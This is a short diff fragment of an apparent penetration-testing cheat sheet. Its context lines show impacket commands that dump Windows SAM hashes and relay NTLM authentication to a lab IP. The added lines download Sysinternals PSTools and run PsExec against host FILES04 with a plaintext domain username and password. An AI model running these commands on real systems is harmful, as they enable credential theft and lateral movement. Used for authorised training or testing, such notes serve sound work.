@@ -448,7 +448,9 @@ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c 
 ```
 ## PsExec
-```bash
+```powershell
+wget https://download.sysinternals.com/files/PSTools.zip
+
 .\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
 
 # OTH
